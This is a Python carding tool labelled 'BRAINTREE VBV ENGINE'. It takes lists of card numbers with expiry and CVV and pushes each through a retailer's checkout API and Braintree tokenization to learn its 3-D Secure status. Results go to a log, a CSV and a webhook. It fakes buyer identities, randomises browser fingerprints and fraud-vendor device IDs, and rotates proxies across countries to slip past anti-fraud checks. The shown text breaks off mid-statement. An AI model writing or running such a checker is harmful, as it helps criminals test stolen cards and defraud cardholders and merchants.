import json as jsonlib
import base64
import re
import uuid
import requests
import random
import time
import csv
import os
import sys
import logging
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from typing import Optional, Tuple, List, Dict, Any

###############################################################################
#  CONFIG LOADER
###############################################################################

class ConfigLoader:
    _inst = None
    _data = {}

    def __new__(cls, path: str = "braintree_config.json"):
        if cls._inst is None:
            cls._inst = super().__new__(cls)
            cls._inst._load(path)
        return cls._inst

    def _load(self, path: str):
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                self._data = jsonlib.load(f)
        else:
            self._data = {}

    def get(self, *keys, default=None):
        val = self._data
        for k in keys:
            if isinstance(val, dict):
                val = val.get(k)
            else:
                return default
            if val is None:
                return default
        return val

###############################################################################
#  IDENTITY GENERATOR
###############################################################################

class IdentityGenerator:
    def __init__(self, cfg: ConfigLoader):
        self._cfg = cfg

    def generate(self) -> Dict[str, Any]:
        first = random.choice(self._cfg.get("identity", "first_names", default=["James"]))
        last = random.choice(self._cfg.get("identity", "last_names", default=["Smith"]))
        domain = random.choice(self._cfg.get("identity", "email_domains", default=["gmail.com"]))
        addr = random.choice(self._cfg.get("identity", "addresses", default=[{"city": "Lima", "street": "Av. Larco", "house_number": "123", "postal_code": "15074"}]))
        username = f"{first.lower()}.{last.lower()}{random.randint(10, 9999)}"
        return {
            "email": f"{username}@{domain}",
            "first_name": first,
            "last_name": last,
            "address": addr
        }

###############################################################################
#  FINGERPRINT GENERATOR
###############################################################################

class FingerprintGenerator:
    def __init__(self, cfg: ConfigLoader):
        self._cfg = cfg

    def generate(self) -> Dict[str, Any]:
        ua = random.choice(self._cfg.get("fingerprint", "user_agents", default=["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:158.0) Gecko/20100101 Firefox/158.0"]))
        screen = random.choice(self._cfg.get("fingerprint", "screen_sizes", default=[{"width": 1920, "height": 1080}]))
        tz = random.choice(self._cfg.get("fingerprint", "timezones", default=[300]))
        lang = random.choice(self._cfg.get("fingerprint", "languages", default=["en-US,en;q=0.9"]))
        return {
            "user_agent": ua,
            "screen_width": screen["width"],
            "screen_height": screen["height"],
            "timezone": tz,
            "language": lang,
            "color_depth": random.choice([24, 30, 48]),
            "ravelin_id": f"rjs-{uuid.uuid4()}",
            "riskified_id": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4())
        }

###############################################################################
#  PROXY MANAGER
###############################################################################

class ProxyManager:
    def __init__(self, cfg: ConfigLoader):
        self._cfg = cfg
        self._current_country_idx = 0
        self._lock = threading.Lock()
        self._session_id = uuid.uuid4().hex
        self._current_country = "US"

    @property
    def current_country(self) -> str:
        return self._current_country

    def get_proxy(self, country_override: str = None) -> Dict[str, str]:
        with self._lock:
            countries = self._cfg.get("proxy", "country_rotation", default=["US"])
            if country_override:
                country = country_override
            else:
                country = countries[self._current_country_idx % len(countries)]
                self._current_country_idx += 1
            self._current_country = country

        apify_cfg = self._cfg.get("proxy", "apify")
        if apify_cfg and apify_cfg.get("enabled"):
            pwd_env = apify_cfg.get("password_env", "")
            password = os.environ.get(pwd_env, "") if pwd_env else ""
            if not password:
                password = apify_cfg.get("password", "")
            url = apify_cfg["url_template"].format(
                country=country,
                session=self._session_id,
                password=password
            )
            return {"http": url, "https": url}

        fallbacks = self._cfg.get("proxy", "fallback_proxies", default=[])
        if fallbacks:
            proxy = random.choice(fallbacks)
            return {"http": proxy, "https": proxy}

        return {}

    def rotate_country(self):
        """Rotar al siguiente pais en la lista."""
        with self._lock:
            self._current_country_idx += 1
            self._session_id = uuid.uuid4().hex


class ProxyValidator:
    """Valida conectividad de proxies y retorna geolocalización."""

    TEST_ENDPOINTS = [
        "https://httpbin.org/ip",
        "https://api.ipify.org?format=json",
        "http://ip-api.com/json/",
    ]

    @staticmethod
    def test(proxy_url: str, timeout: int = 15) -> Dict[str, Any]:
        """
        Prueba un proxy y retorna:
          - working: bool
          - ip: str (IP externa)
          - country: str
          - latency_ms: float
          - error: str
        """
        result = {"working": False, "ip": "", "country": "", "latency_ms": 0, "error": ""}
        proxies = {"http": proxy_url, "https": proxy_url}
        start = time.time()

        for url in ProxyValidator.TEST_ENDPOINTS:
            try:
                r = requests.get(
                    url, proxies=proxies, timeout=timeout,
                    headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
                )
                if r.status_code != 200:
                    continue
                elapsed = (time.time() - start) * 1000
                result["latency_ms"] = round(elapsed, 1)
                data = r.json()
                result["ip"] = data.get("origin", "").split(", ")[0] or data.get("ip", "") or data.get("query", "")
                result["country"] = data.get("country", "") or data.get("countryCode", "")
                result["working"] = True
                return result
            except requests.exceptions.ConnectTimeout:
                result["error"] = "Connection timeout"
            except requests.exceptions.ProxyError as e:
                result["error"] = f"Proxy error: {e}"
            except Exception as e:
                result["error"] = str(e)[:100]

        if not result["error"]:
            result["error"] = "All endpoints failed"
        return result

    @staticmethod
    def test_session(session: requests.Session, timeout: int = 15) -> Dict[str, Any]:
        """Prueba el proxy configurado en una Session de requests."""
        if not session.proxies:
            return {"working": True, "ip": "direct", "country": "", "latency_ms": 0, "error": ""}
        proxy_url = session.proxies.get("http") or session.proxies.get("https") or ""
        return ProxyValidator.test(proxy_url, timeout)

    @staticmethod
    def batch_test(proxy_list: List[str], timeout: int = 15, workers: int = 10) -> List[Dict[str, Any]]:
        """Prueba múltiples proxies concurrentemente."""
        results = []
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures = {ex.submit(ProxyValidator.test, p, timeout): p for p in proxy_list}
            for f in as_completed(futures):
                try:
                    res = f.result()
                    res["proxy"] = futures[f]
                    results.append(res)
                except Exception as e:
                    results.append({"proxy": futures[f], "working": False, "error": str(e)})
        return sorted(results, key=lambda x: not x["working"])


###############################################################################
#  LOGGER SETUP
###############################################################################

class Logger:
    def __init__(self, cfg: ConfigLoader):
        self._cfg = cfg
        self._log_file = cfg.get("output", "log_file", default="braintree_results.log")
        self._csv_file = cfg.get("output", "csv_file", default="braintree_results.csv")
        self._verbose = cfg.get("output", "console_verbose", default=True)
        self._csv_lock = threading.Lock()
        self._stats = {"total": 0, "success": 0, "fail": 0, "errors": {}}
        self._stats_lock = threading.Lock()

        # Init CSV header
        if not os.path.exists(self._csv_file):
            with open(self._csv_file, "w", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow(["timestamp", "card_bin", "result", "status_3ds", "trans_status", "error_detail"])

    def log(self, card_bin: str, result: str, error_detail: str = ""):
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{ts}] BIN={card_bin} | {result}"

        # Console
        if self._verbose:
            print(line)

        # Log file
        with open(self._log_file, "a", encoding="utf-8") as f:
            f.write(line + "\n")

        # CSV
        parts = result.split(" | ")
        status_3ds = parts[0] if len(parts) > 0 else ""
        trans_status = parts[1] if len(parts) > 1 else ""
        is_success = "✗" not in result

        with self._csv_lock:
            with open(self._csv_file, "a", newline="", encoding="utf-8") as f:
                w = csv.writer(f)
                w.writerow([ts, card_bin, "SUCCESS" if is_success else "FAIL", status_3ds, trans_status, error_detail])

        # Stats
        with self._stats_lock:
            self._stats["total"] += 1
            if is_success:
                self._stats["success"] += 1
            else:
                self._stats["fail"] += 1
                err_key = result.split(" | ")[0] if "|" in result else result
                self._stats["errors"][err_key] = self._stats["errors"].get(err_key, 0) + 1

    def print_stats(self):
        s = self._stats
        print(f"\n{'='*50}")
        print(f"  STATS: Total={s['total']} | Success={s['success']} | Fail={s['fail']}")
        if s["errors"]:
            print(f"  Errors breakdown:")
            for k, v in sorted(s["errors"].items(), key=lambda x: -x[1]):
                print(f"    {k}: {v}")
        print(f"{'='*50}")

    def get_stats(self) -> Dict:
        return self._stats

###############################################################################
#  CARD VALIDATOR
###############################################################################

class CardValidator:
    @staticmethod
    def luhn_check(card_num: str) -> bool:
        if not card_num.isdigit():
            return False
        digits = [int(d) for d in card_num]
        checksum = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            checksum += d
        return checksum % 10 == 0

    @staticmethod
    def detect_brand(card_num: str) -> str:
        if re.match(r'^4[0-9]', card_num):
            return "Visa"
        if re.match(r'^5[1-5]', card_num):
            return "MasterCard"
        if re.match(r'^3[47]', card_num):
            return "Amex"
        if re.match(r'^6(?:011|5)', card_num):
            return "Discover"
        if re.match(r'^3(?:0[0-5]|[68])', card_num):
            return "Diners"
        return "Unknown"

    @staticmethod
    def validate(card_num: str, mm: str, yy: str, cvv: str) -> Optional[str]:
        if not card_num.isdigit() or len(card_num) < 13 or len(card_num) > 19:
            return "Invalid card number length"
        if not CardValidator.luhn_check(card_num):
            return "Card fails Luhn check"
        if not mm.isdigit() or not (1 <= int(mm) <= 12):
            return "Invalid month"
        if not yy.isdigit():
            return "Invalid year"
        if not cvv.isdigit() or len(cvv) < 3:
            return "Invalid CVV"
        brand = CardValidator.detect_brand(card_num)
        if brand == "Amex" and len(cvv) != 4:
            return "Amex requires 4-digit CVV"
        if brand != "Amex" and len(cvv) != 3:
            return "Non-Amex requires 3-digit CVV"
        return None

###############################################################################
#  CORE ENGINE
###############################################################################

class BraintreeVBVEngine:
    def __init__(self, cfg: ConfigLoader):
        self._cfg = cfg
        self._proxy_mgr = ProxyManager(cfg)
        self._fp_gen = FingerprintGenerator(cfg)
        self._id_gen = IdentityGenerator(cfg)

    # ── Helpers ──────────────────────────────────────────────────────────

    @staticmethod
    def _cap(text: str, start: str, end: str) -> Optional[str]:
        i = text.find(start)
        if i == -1:
            return None
        j = text.find(end, i + len(start))
        return None if j == -1 else text[i + len(start):j]

    @staticmethod
    def _cap_regex(text: str, pattern: str) -> Optional[str]:
        m = re.search(pattern, text, re.DOTALL)
        return m.group(1) if m else None

    def _delay(self):
        min_d = self._cfg.get("timing", "min_delay", default=0.5)
        max_d = self._cfg.get("timing", "max_delay", default=2.0)
        time.sleep(random.uniform(min_d, max_d))

    def _new_session(self) -> Tuple[requests.Session, Dict]:
        sess = requests.Session()
        proxies = self._proxy_mgr.get_proxy()
        if proxies:
            sess.proxies.update(proxies)
        fp = self._fp_gen.generate()
        identity = self._id_gen.generate()
        sess.headers.update({
            "Accept-Language": fp["language"],
            "User-Agent": fp["user_agent"]
        })
        return sess, fp, identity

    # ── Step 1: Get cookies ─────────────────────────────────────────────

    def _step_product(self, sess: requests.Session, fp: Dict) -> Optional[str]:
        product_url = self._cfg.get("site", "product_url")
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": fp["language"],
            "User-Agent": fp["user_agent"]
        }
        try:
            r = sess.get(product_url, headers=headers, timeout=30)
            if r.status_code != 200:
                return f"✗ PRODUCT | HTTP {r.status_code}"
        except Exception as e:
            return f"✗ PRODUCT | {e}"
        return None

    # ── Step 2: Create express checkout ─────────────────────────────────

    def _step_cart(self, sess: requests.Session, fp: Dict) -> Tuple[Optional[str], Optional[str], float]:
        api_url = self._cfg.get("site", "api_url")
        origin = self._cfg.get("site", "origin_url")
        product_url = self._cfg.get("site", "product_url")
        country_iso = self._cfg.get("site", "country_iso")
        currency = self._cfg.get("site", "currency")
        country = self._cfg.get("site", "country")
        product_id = self._cfg.get("site", "product_id")
        variant_id = self._cfg.get("site", "variant_id")
        value_amount = self._cfg.get("site", "value_amount")

        headers = {
            "Accept": "application/graphql-response+json, application/json",
            "Accept-Language": fp["language"],
            "Content-Type": "application/json",
            "Origin": origin,
            "Referer": product_url,
            "User-Agent": fp["user_agent"]
        }
        payload = {
            "operationName": "ExpressCheckout",
            "query": "mutation ExpressCheckout($expressCheckoutInput: ExpressCheckoutInput!) { startExpressCheckout(expressCheckoutInput: $expressCheckoutInput) { expressCheckoutData { orderId omsOrderId cartId cartTotal } } }",
            "variables": {
                "expressCheckoutInput": {
                    "address": {"country": country_iso},
                    "browserData": {
                        "colorDepth": fp["color_depth"],
                        "language": fp["language"].split(";")[0],
                        "screenHeight": fp["screen_height"],
                        "screenWidth": fp["screen_width"],
                        "userAgent": fp["user_agent"]
                    },
                    "currency": currency,
                    "languageSlug": "en",
                    "paymentCurrency": currency,
                    "quantity": 1,
                    "ravelinDeviceId": fp["ravelin_id"],
                    "riskifiedSessionId": fp["riskified_id"],
                    "selectedProductData": {
                        "country": country,
                        "productId": product_id,
                        "quantity": 1,
                        "valueAmount": value_amount,
                        "variantId": variant_id
                    }
                }
            }
        }
        try:
            r = sess.post(api_url, headers=headers, json=payload, timeout=30)
            cart_id = self._cap(r.text, '"cartId":"', '"')
            cart_total = float(self._cap_regex(r.text, r'"cartTotal":([0-9.]+)') or 0)
            if not cart_id:
                return "✗ CART", None, 0.0
            return None, cart_id, cart_total
        except Exception as e:
            return f"✗ CART | {e}", None, 0.0

    # ── Step 3: Update email ────────────────────────────────────────────

    def _step_email(self, sess: requests.Session, fp: Dict, cart_id: str, email: str) -> Optional[str]:
        api_url = self._cfg.get("site", "api_url")
        origin = self._cfg.get("site", "origin_url")
        product_url = self._cfg.get("site", "product_url")

        headers = {
            "Accept": "application/graphql-response+json, application/json",
            "Accept-Language": fp["language"],
            "Content-Type": "application/json",
            "Origin": origin,
            "Referer": product_url,
            "User-Agent": fp["user_agent"]
        }
        payload = {
            "operationName": "UpdateCartCustomerEmail",
            "query": "mutation UpdateCartCustomerEmail($updateCartCustomerInput: UpdateCartCustomerInput!) { updateCartCustomer(updateCartCustomerInput: $updateCartCustomerInput) { __typename } }",
            "variables": {
                "updateCartCustomerInput": {
                    "cartId": cart_id,
                    "customerEmail": email
                }
            }
        }
        try:
            r = sess.post(api_url, headers=headers, json=payload, timeout=30)
            if r.status_code != 200:
                return f"✗ EMAIL | HTTP {r.status_code}"
        except Exception as e:
            return f"✗ EMAIL | {e}"
        return None

    # ── Step 4: Get payment methods ─────────────────────────────────────

    def _step_methods(self, sess: requests.Session, fp: Dict, cart_id: str, cart_total: float) -> Optional[str]:
        api_url = self._cfg.get("site", "api_url")
        origin = self._cfg.get("site", "origin_url")
        product_url = self._cfg.get("site", "product_url")
        currency = self._cfg.get("site", "currency")
        product_brand = self._cfg.get("site", "product_brand")
        product_id = self._cfg.get("site", "product_id")
        category_ids = self._cfg.get("site", "category_ids", default=[])

        headers = {
            "Accept": "application/graphql-response+json, application/json",
            "Accept-Language": fp["language"],
            "Content-Type": "application/json",
            "Origin": origin,
            "Referer": product_url,
            "User-Agent": fp["user_agent"]
        }
        payload = {
            "operationName": "getPaymentMethods",
            "query": "query getPaymentMethods($getPaymentMethodsInput: GetPaymentMethodsInput!) { getPaymentMethods(getPaymentMethodsInput: $getPaymentMethodsInput) { paymentMethods { id type } } }",
            "variables": {
                "getPaymentMethodsInput": {
                    "cartId": cart_id,
                    "categoryIds": category_ids,
                    "currency": currency,
                    "orderValue": cart_total,
                    "productBrand": product_brand,
                    "productId": product_id
                }
            }
        }
        try:
            r = sess.post(api_url, headers=headers, json=payload, timeout=30)
            if '"Visa"' not in r.text:
                return "✗ METHODS | Visa not available"
        except Exception as e:
            return f"✗ METHODS | {e}"
        return None

    # ── Step 5: Select Visa ─────────────────────────────────────────────

    def _step_select(self, sess: requests.Session, fp: Dict, cart_id: str, email: str) -> Optional[str]:
        api_url = self._cfg.get("site", "api_url")
        origin = self._cfg.get("site", "origin_url")
        product_url = self._cfg.get("site", "product_url")
        currency = self._cfg.get("site", "currency")
        country = self._cfg.get("site", "country")
        product_id = self._cfg.get("site", "product_id")
        variant_id = self._cfg.get("site", "variant_id")

        headers = {
            "Accept": "application/graphql-response+json, application/json",
            "Accept-Language": fp["language"],
            "Content-Type": "application/json",
            "Origin": origin,
            "Referer": product_url,
            "User-Agent": fp["user_agent"]
        }
        payload = {
            "operationName": "SelectPaymentMethod",
            "query": "mutation SelectPaymentMethod($selectPaymentMethodInput: SelectPaymentMethodInput!) { selectPaymentMethod(selectPaymentMethodInput: $selectPaymentMethodInput) { requiredFields } }",
            "variables": {
                "selectPaymentMethodInput": {
                    "browserData": {
                        "colorDepth": fp["color_depth"],
                        "language": fp["language"].split(";")[0],
                        "screenHeight": fp["screen_height"],
                        "screenWidth": fp["screen_width"],
                        "userAgent": fp["user_agent"]
                    },
                    "cartId": cart_id,
                    "currency": currency,
                    "email": email,
                    "paymentMethod": "Visa",
                    "productData": {
                        "country": country,
                        "productId": product_id,
                        "quantity": 1,
                        "variantId": variant_id
                    }
                }
            }
        }
        try:
            r = sess.post(api_url, headers=headers, json=payload, timeout=30)
            if r.status_code != 200:
                return f"✗ SELECT | HTTP {r.status_code}"
        except Exception as e:
            return f"✗ SELECT | {e}"
        return None

    # ── Step 6: Save personal details ───────────────────────────────────

    def _step_details(self, sess: requests.Session, fp: Dict, cart_id: str, identity: Dict) -> Optional[str]:
        api_url = self._cfg.get("site", "api_url")
        origin = self._cfg.get("site", "origin_url")
        product_url = self._cfg.get("site", "product_url")
        country_iso = self._cfg.get("site", "country_iso")
        addr = identity["address"]

        headers = {
            "Accept": "application/graphql-response+json, application/json",
            "Accept-Language": fp["language"],
            "Content-Type": "application/json",
            "Origin": origin,
            "Referer": product_url,
            "User-Agent": fp["user_agent"]
        }
        payload = {
            "operationName": "UpdatePersonalDetails",
            "query": "mutation UpdatePersonalDetails($updatePersonalDetailsInput: UpdatePersonalDetailsInput!) { updatePersonalDetails(updatePersonalDetailsInput: $updatePersonalDetailsInput) { step } }",
            "variables": {
                "updatePersonalDetailsInput": {
                    "address": {
                        "city": addr["city"],
                        "country": country_iso,
                        "houseNumber": addr["house_number"],
                        "postalCode": addr["postal_code"],
                        "street": addr["street"]
                    },
                    "cartId": cart_id,
                    "firstName": identity["first_name"],
                    "lastName": identity["last_name"],
                    "ravelinDeviceId": fp["ravelin_id"],
                    "regionalLocale": "en_US",
                    "riskifiedSessionId": fp["riskified_id"]
                }
            }
        }
        try:
            r = sess.post(api_url, headers=headers, json=payload, timeout=30)
            if r.status_code != 200:
                return f"✗ DETAILS | HTTP {r.status_code}"
        except Exception as e:
            return f"✗ DETAILS | {e}"
        return None

    # ── Step 7: Initiate Braintree payment session ──────────────────────

    def _step_session(self, sess: requests.Session, fp: Dict, cart_id: str, cart_total: float) -> Tuple[Optional[str], Optional[Dict]]:
        api_url = self._cfg.get("site", "api_url")
        origin = self._cfg.get("site", "origin_url")
        product_url = self._cfg.get("site", "product_url")

        headers = {
            "Accept": "application/graphql-response+json, application/json",
            "Accept-Language": fp["language"],
            "Content-Type": "application/json",
            "Origin": origin,
            "Referer": product_url,
            "User-Agent": fp["user_agent"]
        }
        payload = {
            "operationName": "InitiatePaymentSession",
            "query": "mutation InitiatePaymentSession($initiatePaymentSessionInput: InitiatePaymentSessionInput!) { initiatePaymentSession(initiatePaymentSessionInput: $initiatePaymentSessionInput) { payment { id status pspData { pspId data } } orderId omsOrderId returnUrl } }",
            "variables": {
                "initiatePaymentSessionInput": {
                    "cartId": cart_id,
                    "ravelinDeviceId": fp["ravelin_id"],
                    "regionalLocale": "en_US",
                    "riskifiedSessionId": fp["riskified_id"]
                }
            }
        }
        try:
            r = sess.post(api_url, headers=headers, json=payload, timeout=30)
            data = jsonlib.loads(r.text).get("data") or {}
            payment = (data.get("initiatePaymentSession") or {}).get("payment") or {}
            psp_data = payment.get("pspData")
            if not psp_data:
                return f"✗ SESSION | Status={payment.get('status')}", None
            psp = jsonlib.loads(psp_data.get("data") or "{}")
            client_token = psp.get("clientToken")
            price = float(psp.get("price") or cart_total)
            if not client_token:
                return "✗ SESSION | No clientToken", None
            token_data = jsonlib.loads(base64.b64decode(client_token + "=" * (-len(client_token) % 4)))
            bt_info = {
                "auth_fingerprint": token_data["authorizationFingerprint"],
                "merchant_id": token_data["merchantId"],
                "graphql_url": token_data["graphQL"]["url"],
                "graphql_version": token_data["graphQL"]["date"],
                "price": price
            }
            return None, bt_info
        except Exception as e:
            return f"✗ SESSION | {e}", None

    # ── Step 8: Tokenize card in Braintree ──────────────────────────────

    def _step_tokenize(self, sess: requests.Session, fp: Dict, bt_info: Dict, card: str, mm: str, yy: str, cvv: str, identity: Dict) -> Tuple[Optional[str], Optional[str]]:
        exp_year = yy if len(yy) == 4 else "20" + yy
        headers = {
            "Accept": "*/*",
            "Accept-Language": fp["language"],
            "Authorization": f"Bearer {bt_info['auth_fingerprint']}",
            "Braintree-Version": bt_info["graphql_version"],
            "Content-Type": "application/json",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "User-Agent": fp["user_agent"]
        }
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": fp["session_id"]
            },
            "operationName": "TokenizeCreditCard",
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": card,
                        "expirationMonth": mm.zfill(2),
                        "expirationYear": exp_year,
                        "cvv": cvv,
                        "cardholderName": f"{identity['first_name']} {identity['last_name']}"
                    },
                    "options": {"validate": False}
                }
            }
        }
        try:
            r = sess.post(bt_info["graphql_url"], headers=headers, json=payload, timeout=30)
            nonce = self._cap(r.text, '"token":"', '"')
            if not nonce:
                return "✗ TOKENIZE", None
            return None, nonce
        except Exception as e:
            return f"✗ TOKENIZE | {e}", None

    # ── Step 9: 3DS lookup ──────────────────────────────────────────────

    def _step_3ds(self, sess: requests.Session, fp: Dict, bt_info: Dict, nonce: str, card_bin: str, email: str) -> str:
        braintree_client = self._cfg.get("site", "braintree_client")
        headers = {
            "Accept": "*/*",
            "Accept-Language": fp["language"],
            "Braintree-Version": "2018-05-08",
            "Content-Type": "application/json",
            "User-Agent": fp["user_agent"]
        }
        payload = {
            "additionalInfo": {"email": email},
            "amount": f"{bt_info['price']:.2f}",
            "authorizationFingerprint": bt_info["auth_fingerprint"],
            "bin": card_bin[:6],
            "browserColorDepth": fp["color_depth"],
            "browserJavaEnabled": False,
            "browserJavascriptEnabled": True,
            "browserLanguage": fp["language"].split(";")[0].split(",")[0],
            "browserScreenHeight": fp["screen_height"],
            "browserScreenWidth": fp["screen_width"],
            "browserTimeZone": fp["timezone"],
            "clientMetadata": {
                "requestedThreeDSecureVersion": "2",
                "sdkVersion": "web/3.102.0"
            },
            "deviceChannel": "Browser",
            "dfReferenceId": fp["ravelin_id"]
        }
        try:
            r = sess.post(
                f"{braintree_client}/{bt_info['merchant_id']}/client_api/v1/payment_methods/{nonce}/three_d_secure/lookup",
                headers=headers, json=payload, timeout=30
            )
            lookup = jsonlib.loads(r.text)
            three_ds = ((lookup.get("paymentMethod") or {}).get("threeDSecureInfo") or {})
            lookup_data = lookup.get("lookup") or {}
            status_3ds = three_ds.get("status") or ""
            trans_status = (
                lookup_data.get("transStatus")
                or (three_ds.get("authentication") or {}).get("transStatus")
                or (three_ds.get("lookup") or {}).get("transStatus")
                or ""
            )
            # Check for challenge URL (3DS v2 challenge flow)
            challenge_url = (
                lookup_data.get("threeDSecureAuthentication") or {}
            ).get("challengeUrl") or ""
            if challenge_url and trans_status == "C":
                return f"CHALLENGE | {trans_status} | {challenge_url[:80]}..."
            return f"{status_3ds or 'Unavailable'} | {trans_status}"
        except Exception as e:
            return f"✗ CHECKOUT | {e}"

    # ── Full execution with retry ───────────────────────────────────────

    def execute(self, card: str, mm: str, yy: str, cvv: str) -> str:
        max_retries = self._cfg.get("retry", "max_attempts", default=1)
        retry_on = self._cfg.get("retry", "retry_on", default=[])
        retry_delay = self._cfg.get("timing", "retry_delay", default=3.0)
        card_bin = card[:6]
        max_country_rotations = 3
        used_country = "US"

        for attempt in range(1, max_retries + 1):
            for country_try in range(max_country_rotations):
                sess, fp, identity = self._new_session()
                used_country = self._proxy_mgr.current_country
                email = identity["email"]

                # Step 1
                err = self._step_product(sess, fp)
                if err:
                    if attempt < max_retries and any(e in err for e in retry_on):
                        time.sleep(retry_delay)
                        continue
                    return f"{err} | 🌐 {used_country}"
                self._delay()

                # Step 2
                err, cart_id, cart_total = self._step_cart(sess, fp)
                if err:
                    if attempt < max_retries and any(e in err for e in retry_on):
                        time.sleep(retry_delay)
                        continue
                    return f"{err} | 🌐 {used_country}"
                self._delay()

                # Step 3
                err = self._step_email(sess, fp, cart_id, email)
                if err:
                    return f"{err} | 🌐 {used_country}"
                self._delay()

                # Step 4
                err = self._step_methods(sess, fp, cart_id, cart_total)
                if err:
                    return f"{err} | 🌐 {used_country}"
                self._delay()

                # Step 5
                err = self._step_select(sess, fp, cart_id, email)
                if err:
                    return f"{err} | 🌐 {used_country}"
                self._delay()

                # Step 6
                err = self._step_details(sess, fp, cart_id, identity)
                if err:
                    return f"{err} | 🌐 {used_country}"
                self._delay()

                # Step 7
                err, bt_info = self._step_session(sess, fp, cart_id, cart_total)
                if err:
                    if "Status=failed" in err and country_try < max_country_rotations - 1:
                        self._proxy_mgr.rotate_country()
                        time.sleep(retry_delay)
                        continue
                    if attempt < max_retries and any(e in err for e in retry_on):
                        time.sleep(retry_delay)
                        continue
                    return f"{err} | 🌐 {used_country}"
                self._delay()

                # Step 8
                err, nonce = self._step_tokenize(sess, fp, bt_info, card, mm, yy, cvv, identity)
                if err:
                    return f"{err} | 🌐 {used_country}"
                self._delay()

                # Step 9
                result = self._step_3ds(sess, fp, bt_info, nonce, card_bin, email)
                return f"{result} | 🌐 {used_country}"

                break
            else:
                continue
            break

        return f"✗ MAX_RETRIES | 🌐 {used_country}"

###############################################################################
#  CARD SOURCE: FILE
###############################################################################

def load_cards_from_file(path: str) -> List[Tuple[str, str, str, str]]:
    cards = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or line.startswith("//"):
                continue
            parts = [x.strip() for x in line.replace(",", "|").split("|")]
            if len(parts) >= 4:
                cards.append((parts[0], parts[1], parts[2], parts[3]))
    return cards

def load_cards_from_csv(path: str) -> List[Tuple[str, str, str, str]]:
    cards = []
    with open(path, "r", encoding="utf-8") as f:
        reader = csv.reader(f)
        for row in reader:
            if len(row) >= 4:
                cards.append((row[0].strip(), row[1].strip(), row[2].strip(), row[3].strip()))
    return cards

###############################################################################
#  WEBHOOD SENDER
###############################################################################

def send_webhook(url: str, data: Dict):
    if not url:
        return
    try:
        requests.post(url, json=data, timeout=10)
    except:
        pass

###############################################################################
#  MAIN
###############################################################################

def main():
    cfg = ConfigLoader()
    engine = BraintreeVBVEngine(cfg)
    logger = Logger(cfg)
    threading_enabled = cfg.get("threading", "enabled", default=False)
    max_workers = cfg.get("threading", "max_workers", default=5)
    webhook_url = cfg.get("output", "webhook_url", default="")

    # ── Proxy check mode ────────────────────────────────────────────────
    if "--check-proxy" in sys.argv:
        proxy_mgr = ProxyManager(cfg)
        proxy = proxy_mgr.get_proxy()
        if not proxy:
            print("  No proxy configured in braintree_config.json")
            return
        proxy_url = proxy.get("http") or proxy.get("https") or ""
        print(f"\n  Testing proxy: {proxy_url[:80]}...")
        result = ProxyValidator.test(proxy_url)
        if result["working"]:
            print(f"  ✓ WORKING")
            print(f"    IP:       {result['ip']}")
            print(f"    Country:  {result['country']}")
            print(f"    Latency:  {result['latency_ms']}ms")
        else:
            print(f"  ✗ FAILED")
            print(f"    Error: {result['error']}")
        return

    print(f"{'='*60}")
    print(f"  BRAINTREE VBV ENGINE v2.0")
    print(f"  Config: braintree_config.json")
    print(f"  Threading: {'ON' if threading_enabled else 'OFF'} ({max_workers} workers)")
    print(f"  Flags: --check-proxy (test proxy only)")
    print(f"{'='*60}")

    # Determine input source
    cards = []
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg.endswith(".csv"):
            cards = load_cards_from_csv(arg)
            print(f"  Loaded {len(cards)} cards from CSV: {arg}")
        elif arg.endswith(".txt"):
            cards = load_cards_from_file(arg)
            print(f"  Loaded {len(cards)} cards from TXT: {arg}")
        elif arg == "--check-proxy":
            pass  # already handled above
        else:
            print(f"  Unknown file type: {arg}")
            return

    if not cards:
        # Interactive mode
        print("\n  Enter cards as: number|mm|yy|cvv")
        print("  Or: number,mm,yy,cvv")
        print("  Empty line to exit\n")
        try:
            while True:
                line = input("Card: ").strip()
                if not line:
                    break
                parts = [x.strip() for x in line.replace(",", "|").split("|")]
                if len(parts) < 4:
                    print("  Invalid format. Use: number|mm|yy|cvv")
                    continue
                card, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]

                # Validate
                val_err = CardValidator.validate(card, mm, yy, cvv)
                if val_err:
                    print(f"  Validation error: {val_err}")
                    logger.log(card[:6], f"✗ VALIDATION | {val_err}")
                    continue

                result = engine.execute(card, mm, yy, cvv)
                logger.log(card[:6], result)
                if webhook_url:
                    send_webhook(webhook_url, {"bin": card[:6], "result": result})
        except KeyboardInterrupt:
            print("\n  Aborted by user")
    else:
        # Batch mode
        if threading_enabled and len(cards) > 1:
            # Multi-threaded
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {}
                for card, mm, yy, cvv in cards:
                    val_err = CardValidator.validate(card, mm, yy, cvv)
                    if val_err:
                        logger.log(card[:6], f"✗ VALIDATION | {val_err}")
                        continue
                    future = executor.submit(engine.execute, card, mm, yy, cvv)
                    futures[future] = card[:6]

                for future in as_completed(futures):
                    card_bin = futures[future]
                    try:
                        result = future.result()
                    except Exception as e:
                        result = f"✗ THREAD | {e}"
                    logger.log(card_bin, result)
                    if webhook_url:
                        send_webhook(webhook_url, {"bin": card_bin, "result": result})
        else:
            # Sequential batch
            for card, mm, yy, cvv in cards:
                val_err = CardValidator.validate(card, mm, yy, cvv)
                if val_err:
                    logger.log(card[:6], f"✗ VALIDATION | {val_err}")
                    continue
                result = engine.execute(card, mm, yy, cvv)
                logger.log(card[:6], result)
                if webhook_url:
